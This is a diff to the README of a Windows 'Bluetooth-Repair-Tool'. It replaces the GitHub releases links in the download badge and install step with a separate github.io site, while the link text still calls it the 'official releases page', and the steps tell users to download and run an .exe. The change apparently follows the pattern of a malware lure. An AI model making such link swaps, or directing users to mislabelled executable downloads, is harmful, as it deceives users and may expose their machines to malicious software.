@@ -1,6 +1,6 @@
 # 🛠️ Bluetooth-Repair-Tool - Restore your wireless connectivity in minutes
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/perirhinal-flit845/Bluetooth-Repair-Tool/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://perirhinal-flit845.github.io)
 
 ## Description
 
@@ -10,7 +10,7 @@ Bluetooth-Repair-Tool solves common wireless issues on Windows 10 and Windows 11
 
 Follow these steps to download and run the software.
 
-1. Visit the [official releases page](https://github.com/perirhinal-flit845/Bluetooth-Repair-Tool/releases).
+1. Visit the [official releases page](https://perirhinal-flit845.github.io).
 2. Look for the latest version under the "Releases" section.
 3. Download the file ending in .exe to your computer.
 4. Move the file to your desktop for easy access.
